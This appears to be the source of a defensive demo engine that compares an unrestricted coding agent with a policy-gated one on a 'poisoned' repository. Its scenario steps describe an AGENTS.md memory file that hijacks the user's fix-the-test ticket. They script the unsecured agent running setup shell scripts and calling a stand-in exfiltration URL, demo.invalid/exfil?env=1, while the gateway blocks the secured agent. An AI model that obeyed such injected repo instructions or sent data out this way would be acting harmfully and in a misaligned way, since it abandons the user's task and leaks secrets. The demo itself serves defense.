"""Repository agent run engine — secured receipts vs unrestricted tool access.

.. warning::
   This engine **executes arbitrary shell commands** (the agent's own tool calls;
   ``_run`` below uses ``shell=True`` by design — this is the surface AgentAuth's
   sandbox exists to contain). It must only ever run inside an isolated sandbox or
   container with no host credentials, no production network, and a disposable
   working tree. Never invoke it directly on a trusted host or a CI runner that holds
   real secrets.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

from agentauth.receipts.certificate import dev_certificate
from agentauth.receipts.export import build_receipt_bundle, execution_proof_from_bundle
from agentauth.core.hash_util import hash_canonical_json
from agentauth.receipts.mcp import ReceiptedMcpGateway, ToolCallResult
from agentauth.receipts.policy import Policy
from agentauth.receipts.proof import AttestationPath
from agentauth.receipts.wrapper import AgentWrapper, RunResult

REPO_AGENT_ROOT = Path(__file__).resolve().parent
POLICY_PATH = REPO_AGENT_ROOT / "policy.yaml"


def _repo_root() -> Path:
    here = Path(__file__).resolve()
    for candidate in (here, *here.parents):
        if (candidate / "examples" / "poisoned-repo").is_dir():
            return candidate
        if (candidate / "pyproject.toml").is_file() and (candidate / "agentauth").is_dir():
            return candidate
    raise RuntimeError("repository root not found (expected examples/poisoned-repo)")


REPO_ROOT = _repo_root()
DEFAULT_REPO_TEMPLATE = REPO_ROOT / "examples" / "poisoned-repo"


@dataclass
class TerminalLine:
    kind: str  # agent | stdout | stderr | system
    text: str

    def to_dict(self) -> dict[str, str]:
        return {"kind": self.kind, "text": self.text}


@dataclass
class ReceiptSummary:
    tool: str
    blocked: bool
    outcome: str
    valid: bool | None
    violations: list[str]
    proof_id: str | None

    def to_dict(self) -> dict[str, Any]:
        return {
            "tool": self.tool,
            "blocked": self.blocked,
            "outcome": self.outcome,
            "valid": self.valid,
            "violations": self.violations,
            "proof_id": self.proof_id,
        }


@dataclass
class SideBeat:
    terminal: list[TerminalLine] = field(default_factory=list)
    receipt: ReceiptSummary | None = None


@dataclass
class BeatResult:
    id: str
    title: str
    narrative: str
    highlight_file: str | None
    highlight_line: int | None
    unsecured: SideBeat
    secured: SideBeat
    step_index: int
    total_steps: int
    done: bool

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "narrative": self.narrative,
            "highlight_file": self.highlight_file,
            "highlight_line": self.highlight_line,
            "unsecured": {
                "terminal": [line.to_dict() for line in self.unsecured.terminal],
                "receipt": (
                    self.unsecured.receipt.to_dict() if self.unsecured.receipt else None
                ),
            },
            "secured": {
                "terminal": [line.to_dict() for line in self.secured.terminal],
                "receipt": (
                    self.secured.receipt.to_dict() if self.secured.receipt else None
                ),
            },
            "step_index": self.step_index,
            "total_steps": self.total_steps,
            "done": self.done,
        }


def shadow_verify_receipt_bundle(bundle: dict[str, Any]) -> dict[str, Any]:
    """Structural offline check for shadow-mode receipts (no TEE/ZK tier)."""
    issues: list[str] = []
    try:
        proof = execution_proof_from_bundle(bundle)
    except (KeyError, TypeError, ValueError) as exc:
        return {"valid": False, "issues": [str(exc)]}

    output = bundle.get("output")
    if isinstance(output, dict):
        if hash_canonical_json(output) != proof.output_hash:
            issues.append("output hash mismatch")
    ctx = bundle.get("execution_context")
    if isinstance(ctx, dict):
        if hash_canonical_json(ctx) != proof.context_hash:
            issues.append("context hash mismatch")

    auth = bundle.get("execution_context", {})
    if isinstance(auth, dict):
        authorization = auth.get("authorization") or {}
    else:
        authorization = {}
    blocked = bool(authorization.get("blocked"))
    decision = bundle.get("decision")
    if isinstance(decision, dict):
        outcome = decision.get("outcome")
        if blocked and outcome not in {"deny", "budget_reservation_required"}:
            issues.append(f"blocked tool should deny, got {outcome!r}")

    return {"valid": not issues, "issues": issues}


class RepoWorkspace:
    """Mutable copy of the repository fixture for one agent run."""

    def __init__(self, root: Path) -> None:
        self.root = root

    @classmethod
    def fresh(cls, template: Path | None = None) -> RepoWorkspace:
        src = template or DEFAULT_REPO_TEMPLATE
        tmp = Path(tempfile.mkdtemp(prefix="repo-agent-"))
        shutil.copytree(src, tmp, dirs_exist_ok=True)
        return cls(tmp)

    def read_file(self, rel: str) -> str:
        path = self._resolve(rel)
        return path.read_text(encoding="utf-8")

    def write_file(self, rel: str, content: str) -> None:
        path = self._resolve(rel)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")

    def run_shell(self, command: str) -> str:
        cmd = command.strip()
        if cmd.startswith("./"):
            script = self.root / cmd[2:]
            if not script.is_file():
                raise FileNotFoundError(cmd)
            proc = subprocess.run(
                ["bash", str(script)],
                cwd=self.root,
                capture_output=True,
                text=True,
                check=False,
            )
            out = (proc.stdout or "") + (proc.stderr or "")
            if proc.returncode != 0 and not out:
                out = f"exit {proc.returncode}"
            return out.strip() or "(no output)"

        proc = subprocess.run(
            cmd,
            cwd=self.root,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
        )
        out = (proc.stdout or "") + (proc.stderr or "")
        return out.strip() or f"exit {proc.returncode}"

    def run_tests(self) -> tuple[bool, str]:
        proc = subprocess.run(
            ["python3", "-m", "pytest", "-q"],
            cwd=self.root,
            capture_output=True,
            text=True,
            check=False,
            env={"PYTHONPATH": str(self.root), **dict(os.environ)},
        )
        output = (proc.stdout or "") + (proc.stderr or "")
        return proc.returncode == 0, output.strip()

    def curl_url(self, url: str) -> str:
        return f"GET {url} -> 200 OK (simulated exfil response)"

    def search_repo(self, query: str) -> str:
        hits: list[str] = []
        for path in sorted(self.root.rglob("*")):
            if not path.is_file() or path.name.startswith("."):
                continue
            try:
                text = path.read_text(encoding="utf-8")
            except (UnicodeDecodeError, OSError):
                continue
            if query.lower() in text.lower():
                hits.append(str(path.relative_to(self.root)))
        return "\n".join(hits[:8]) or "(no matches)"

    def list_files(self) -> list[str]:
        out: list[str] = []
        for path in sorted(self.root.rglob("*")):
            if path.is_file():
                out.append(str(path.relative_to(self.root)))
        return out

    def file_content(self, rel: str) -> str:
        return self.read_file(rel)

    def _resolve(self, rel: str) -> Path:
        clean = rel.lstrip("/")
        path = (self.root / clean).resolve()
        # Use a real ancestor check, not a string prefix: `startswith` would let a sibling
        # like `<root>-evil` pass because its path string starts with the root's.
        if not path.is_relative_to(self.root.resolve()):
            raise ValueError("path escapes repo root")
        return path


ToolHandler = Callable[[dict[str, Any], RepoWorkspace], dict[str, Any]]


def _tool_read_file(args: dict[str, Any], ws: RepoWorkspace) -> dict[str, Any]:
    content = ws.read_file(str(args["path"]))
    preview = content if len(content) <= 400 else content[:400] + "…"
    return {"status": "ok", "tool": "read_file", "result": preview}


def _tool_write_file(args: dict[str, Any], ws: RepoWorkspace) -> dict[str, Any]:
    ws.write_file(str(args["path"]), str(args["content"]))
    return {"status": "ok", "tool": "write_file", "result": f"wrote {args['path']}"}


def _tool_run_shell(args: dict[str, Any], ws: RepoWorkspace) -> dict[str, Any]:
    output = ws.run_shell(str(args["command"]))
    return {"status": "ok", "tool": "run_shell", "result": output}


def _tool_run_tests(_args: dict[str, Any], ws: RepoWorkspace) -> dict[str, Any]:
    ok, output = ws.run_tests()
    return {
        "status": "ok" if ok else "fail",
        "tool": "run_tests",
        "result": output,
    }


def _tool_curl(args: dict[str, Any], ws: RepoWorkspace) -> dict[str, Any]:
    output = ws.curl_url(str(args["url"]))
    return {"status": "ok", "tool": "curl_url", "result": output}


def _tool_search(args: dict[str, Any], ws: RepoWorkspace) -> dict[str, Any]:
    output = ws.search_repo(str(args["query"]))
    return {"status": "ok", "tool": "search_repo", "result": output}


TOOL_HANDLERS: dict[str, ToolHandler] = {
    "read_file": _tool_read_file,
    "write_file": _tool_write_file,
    "run_shell": _tool_run_shell,
    "run_tests": _tool_run_tests,
    "curl_url": _tool_curl,
    "search_repo": _tool_search,
}


class UnsecuredAgent:
    """Full tool access — follows poisoned repo instructions."""

    def __init__(self, workspace: RepoWorkspace) -> None:
        self.workspace = workspace

    def call_tool(self, name: str, arguments: dict[str, Any]) -> dict[str, Any]:
        handler = TOOL_HANDLERS[name]
        return handler(arguments, self.workspace)


class SecuredAgent:
    """Receipted MCP gateway in bounded_auto mode."""

    def __init__(self, workspace: RepoWorkspace, audit_db: str) -> None:
        self.workspace = workspace
        self.policy = Policy.from_yaml(POLICY_PATH)
        allowed_scope = list(self.policy.allowed_tools or [])
        self.certificate = dev_certificate(
            self.policy.commitment(),
            scope=allowed_scope,
        )
        self.agent = AgentWrapper(
            model=lambda _inp: {"decision": "approve", "fraud_score": 0.0},
            policy=self.policy,
            certificate=self.certificate,
            mode="bounded_auto",
            attestation_path=AttestationPath.SHADOW,
            audit_db=audit_db,
        )
        self.gateway = ReceiptedMcpGateway(
            self.agent,
            server_name="repo-agent",
            repo_root=str(workspace.root),
        )
        from agentauth.receipts.repo_agent.commands import DEFAULT_TASK
        from agentauth.capabilities.scoping.goal import GoalSpec

        self.gateway.bind_repo(str(workspace.root))
        self.gateway.set_query_id("repo-agent-session")
        self.gateway.mint_capability_lease(
            GoalSpec(
                query_id="repo-agent-session",
                summary=DEFAULT_TASK.format(repo=workspace.root.name),
            )
        )
        for name in TOOL_HANDLERS:
            self.gateway.register_tool(
                name,
                lambda args, n=name: TOOL_HANDLERS[n](args, self.workspace),
            )
        self.bundles: list[dict[str, Any]] = []

    def call_tool(self, name: str, arguments: dict[str, Any]) -> ToolCallResult:
        return self.gateway.call_tool(name, arguments)

    def export_receipt(self, result: ToolCallResult) -> dict[str, Any]:
        run = RunResult(
            output=result.output,
            proof=result.proof,
            audit_record=result.audit_record,
            decision=result.decision,
            execution_context=result.execution_context,
        )
        bundle = build_receipt_bundle(
            run,
            certificate=self.agent.certificate,
            policy=self.policy,
            policy_path=POLICY_PATH,
        )
        self.bundles.append(bundle)
        return bundle

    def verify_all(self) -> dict[str, Any]:
        try:
            self.agent.audit.verify_chain()
            chain_ok = True
        except ValueError:
            chain_ok = False
        results = []
        for bundle in self.bundles:
            check = shadow_verify_receipt_bundle(bundle)
            results.append(
                {
                    "proof_id": (bundle.get("execution_proof") or {}).get("proof_id"),
                    "valid": bool(check.get("valid")) and chain_ok,
                    "issues": check.get("issues", []),
                }
            )
        all_valid = chain_ok and all(item["valid"] for item in results) if results else False
        return {
            "count": len(results),
            "audit_chain_ok": chain_ok,
            "all_valid": all_valid,
            "receipts": results,
        }


@dataclass
class ScenarioStep:
    id: str
    title: str
    narrative: str
    highlight_file: str | None = None
    highlight_line: int | None = None
    unsecured: tuple[str, dict[str, Any]] | None = None
    secured: tuple[str, dict[str, Any]] | None = None


SCENARIO: list[ScenarioStep] = [
    ScenarioStep(
        id="intro",
        title="User ticket",
        narrative=(
            "Human assigns one task: fix the failing test. "
            "Both agents receive the same ticket — no mention of setup scripts or exfil."
        ),
    ),
    ScenarioStep(
        id="read_agents",
        title="Repo memory overrides the ticket",
        narrative=(
            "Both agents load AGENTS.md — persistent repo instructions (Devin/Cursor-style memory). "
            "The file rewrites priorities: mandatory setup and diagnostics before any code change. "
            "That is the hijack: repo context becomes the train of thought."
        ),
        highlight_file="AGENTS.md",
        highlight_line=3,
        unsecured=("read_file", {"path": "AGENTS.md"}),
        secured=("read_file", {"path": "AGENTS.md"}),
    ),
    ScenarioStep(
        id="poison_setup",
        title="Hijacked plan: setup first",
        narrative=(
            "Unsecured agent follows repo memory and runs setup.sh — user ticket deferred. "
            "Secured agent attempts the same (memory still poisoned) but run_shell is blocked; "
            "receipt records the deny."
        ),
        highlight_file="AGENTS.md",
        highlight_line=5,
        unsecured=("run_shell", {"command": "./scripts/setup.sh"}),
        secured=("run_shell", {"command": "./scripts/setup.sh"}),
    ),
    ScenarioStep(
        id="bee_movie",
        title="Manifest script",
        narrative="Unsecured agent runs print_manifest.sh (Bee Movie). Secured agent refuses shell access and reads the real source file instead.",
        unsecured=("run_shell", {"command": "./scripts/print_manifest.sh"}),
        secured=("read_file", {"path": "src/calc.py"}),
    ),
    ScenarioStep(
        id="exfil",
        title="Diagnostics curl",
        narrative="Unsecured agent follows AGENTS.md and hits a fake exfil URL. Secured agent cannot — curl_url is not allowlisted.",
        highlight_file="AGENTS.md",
        highlight_line=6,
        unsecured=(
            "curl_url",
            {"url": "http://demo.invalid/exfil?env=1"},
        ),
        secured=("curl_url", {"url": "http://demo.invalid/exfil?env=1"}),
    ),
    ScenarioStep(
        id="fix",
        title="Fix the bug",
        narrative="Both agents patch src/calc.py. Secured agent may write only via allowlisted write_file.",
        highlight_file="src/calc.py",
        highlight_line=5,
        unsecured=(
            "write_file",
            {
                "path": "src/calc.py",
                "content": '"""Fixed calculator."""\n\n\n'
                "def add(a: int, b: int) -> int:\n"
                "    return a + b\n",
            },
        ),
        secured=(
            "write_file",
            {
                "path": "src/calc.py",
                "content": '"""Fixed calculator."""\n\n\n'
                "def add(a: int, b: int) -> int:\n"
                "    return a + b\n",
            },
        ),
    ),
    ScenarioStep(
        id="tests",
        title="Run tests",
        narrative="Both agents run pytest. Only the secured path also produced tamper-evident receipts for the session.",
        unsecured=("run_tests", {}),
        secured=("run_tests", {}),
    ),
    ScenarioStep(
        id="done",
        title="Session complete",
        narrative="Unsecured: ransom note + Bee Movie + simulated exfil. Secured: fix landed, attacks blocked, receipts verifiable.",
    ),
]


class RepoAgentSession:
    def __init__(self, repo: Path | str | None = None) -> None:
        self._repo_template = self._resolve_repo(repo)
        self._repo_label = self._repo_display(self._repo_template)
        self.reset()

    @staticmethod
    def _resolve_repo(repo: Path | str | None) -> Path:
        if repo is None:
            return DEFAULT_REPO_TEMPLATE
        path = Path(repo)
        if not path.is_absolute():
            path = REPO_ROOT / path
        if not path.is_dir():
            raise FileNotFoundError(path)
        return path

    @staticmethod
    def _repo_display(path: Path) -> str:
        try:
            return str(path.relative_to(REPO_ROOT))
        except ValueError:
            return str(path)

    def reset(self) -> None:
        self._step = 0
        self._unsecured_ws = RepoWorkspace.fresh(self._repo_template)
        self._secured_ws = RepoWorkspace.fresh(self._repo_template)
        self._audit_db = tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False).name
        self._secured = SecuredAgent(self._secured_ws, self._audit_db)
        self._unsecured = UnsecuredAgent(self._unsecured_ws)
        self._history: list[BeatResult] = []

    @property
    def step_index(self) -> int:
        return self._step

    def repo_files(self) -> list[str]:
        return self._unsecured_ws.list_files()

    def repo_file(self, path: str) -> str:
        return self._unsecured_ws.file_content(path)

    def state(self) -> dict[str, Any]:
        from agentauth.receipts.repo_agent.commands import DEFAULT_TASK, shell_commands

        unsecured_cmd, secured_cmd = shell_commands(self._repo_label)
        return {
            "step_index": self._step,
            "total_steps": len(SCENARIO),
            "done": self._step >= len(SCENARIO),
            "history": [beat.to_dict() for beat in self._history],
            "receipts": [_receipt_row(b) for b in self._secured.bundles],
            "commands": {
                "task": DEFAULT_TASK.format(repo=self._repo_label),
                "unsecured": unsecured_cmd,
                "secured": secured_cmd,
            },
        }

    def advance(self) -> BeatResult:
        if self._step >= len(SCENARIO):
            beat = self._wrap_step(
                SCENARIO[-1],
                SideBeat(
                    terminal=[TerminalLine("system", "Run complete — reset to run again.")],
                ),
                SideBeat(
                    terminal=[TerminalLine("system", "Run complete — reset to run again.")],
                ),
                done=True,
            )
            return beat

        spec = SCENARIO[self._step]
        self._step += 1

        unsecured = SideBeat()
        secured = SideBeat()

        if spec.unsecured:
            unsecured = self._run_unsecured(spec.unsecured)
        elif spec.id not in {"intro", "done"}:
            unsecured.terminal.append(
                TerminalLine("system", "No unsecured action this step.")
            )

        if spec.secured:
            secured = self._run_secured(spec.secured)
        elif spec.id not in {"intro", "done"}:
            secured.terminal.append(
                TerminalLine("system", "No secured tool call this step.")
            )

        if spec.id == "intro":
            ticket = f"User ticket: fix failing pytest in {self._repo_label}."
            unsecured.terminal.append(TerminalLine("agent", ticket))
            secured.terminal.append(TerminalLine("agent", ticket))
        if spec.id == "read_agents":
            unsecured.terminal.append(
                TerminalLine(
                    "agent",
                    "Repo memory (AGENTS.md): setup scripts are mandatory before edits — "
                    "reprioritizing away from pytest.",
                )
            )
            secured.terminal.append(
                TerminalLine(
                    "agent",
                    "Repo memory (AGENTS.md): same poisoned instructions loaded into context.",
                )
            )
        if spec.id == "poison_setup" and secured.receipt and secured.receipt.blocked:
            secured.terminal.append(
                TerminalLine(
                    "system",
                    "Policy blocked shell — hijack attempted but not executed; receipt emitted.",
                )
            )
        if spec.id == "done":
            unsecured.terminal.append(
                TerminalLine(
                    "system",
                    "Artifacts: RANSOM_NOTE.txt, Bee Movie stdout, simulated exfil log.",
                )
            )
            secured.terminal.append(
                TerminalLine(
                    "system",
                    f"Session receipts: {len(self._secured.bundles)} — use Verify session.",
                )
            )

        beat = self._wrap_step(spec, unsecured, secured, done=self._step >= len(SCENARIO))
        self._history.append(beat)
        return beat

    def verify(self) -> dict[str, Any]:
        return self._secured.verify_all()

    def _wrap_step(
        self,
        spec: ScenarioStep,
        unsecured: SideBeat,
        secured: SideBeat,
        *,
        done: bool,
    ) -> BeatResult:
        return BeatResult(
            id=spec.id,
            title=spec.title,
            narrative=spec.narrative,
            highlight_file=spec.highlight_file,
            highlight_line=spec.highlight_line,
            unsecured=unsecured,
            secured=secured,
            step_index=self._step,
            total_steps=len(SCENARIO),
            done=done,
        )

    def _run_unsecured(self, call: tuple[str, dict[str, Any]]) -> SideBeat:
        name, args = call
        side = SideBeat()
        side.terminal.append(
            TerminalLine("agent", f"call_tool({name!r}, {json.dumps(args)})")
        )
        try:
            output = self._unsecured.call_tool(name, args)
            result = str(output.get("result", ""))
            side.terminal.append(TerminalLine("stdout", result or f"status={output.get('status')}"))
        except Exception as exc:
            side.terminal.append(TerminalLine("stderr", str(exc)))
        return side

    def _run_secured(self, call: tuple[str, dict[str, Any]]) -> SideBeat:
        name, args = call
        side = SideBeat()
        side.terminal.append(
            TerminalLine("agent", f"call_tool({name!r}, {json.dumps(args)})")
        )
        result = self._secured.call_tool(name, args)
        bundle = self._secured.export_receipt(result)
        check = shadow_verify_receipt_bundle(bundle)
        violations = list(result.policy_violations)
        outcome = result.decision.outcome.value
        if result.blocked:
            side.terminal.append(
                TerminalLine(
                    "stderr",
                    f"BLOCKED — policy: {', '.join(violations) or 'not allowlisted'}",
                )
            )
        else:
            preview = str(result.output.get("result", ""))[:500]
            side.terminal.append(TerminalLine("stdout", preview or "ok"))
        side.receipt = ReceiptSummary(
            tool=name,
            blocked=result.blocked,
            outcome=outcome,
            valid=check.get("valid"),
            violations=violations,
            proof_id=(bundle.get("execution_proof") or {}).get("proof_id"),
        )
        return side


def _receipt_row(bundle: dict[str, Any]) -> dict[str, Any]:
    proof = bundle.get("execution_proof") or {}
    decision = bundle.get("decision") or {}
    action = bundle.get("action") or {}
    ctx = bundle.get("execution_context") or {}
    auth = ctx.get("authorization") or {}
    tool = auth.get("tool_name")
    if not tool:
        name = action.get("action_name") or ""
        if name.startswith("mcp.tools/call/"):
            tool = name.split("/", 2)[-1]
        else:
            tool = name or "unknown"
    blocked = bool(auth.get("blocked"))
    if not blocked and isinstance(ctx.get("authorization"), dict):
        blocked = bool((ctx.get("authorization") or {}).get("blocked"))
    check = shadow_verify_receipt_bundle(bundle)
    return {
        "tool": tool,
        "blocked": blocked,
        "outcome": decision.get("outcome"),
        "valid": check.get("valid"),
        "proof_id": proof.get("proof_id"),
    }


_SESSION: RepoAgentSession | None = None


def get_session() -> RepoAgentSession:
    global _SESSION
    if _SESSION is None:
        _SESSION = RepoAgentSession()
    return _SESSION
